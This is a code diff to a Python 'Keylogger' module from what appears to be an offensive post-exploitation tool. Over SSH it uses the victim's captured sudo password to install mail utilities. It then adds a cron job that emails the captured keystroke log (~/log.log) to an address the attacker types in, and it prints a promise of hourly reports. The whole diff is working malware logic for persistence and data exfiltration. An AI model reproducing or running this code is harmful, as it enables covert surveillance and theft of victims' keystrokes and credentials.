@@ -30,10 +30,11 @@ class Keylogger(Module):
 
 	print("Starting...")
 	
-	if (raw_input("Press y to have the file sent to you through email") == 'y'):
-	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mail-utils")
+	if (raw_input("Press y to have the file sent to you through email ") == 'y'):
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install sendmail")
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mailutils")
 	    self.target.ssh.exec_command("crontab -l > mycron")
-	    self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + raw_input("Please input your email address") + "' > script.sh")
+	    self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + raw_input("Please input your email address ") + "' > script.sh")
 	    self.target.ssh.exec_command("echo \"* * * * 0 echo password | sudo -S bash ~/script.sh\" >> mycron && crontab mycron && rm mycron")
-	 
+            print("You will recieve an email(probably in spam) with your new keylogger report every hour.")
 	print(GOOD + self.name + " module success")
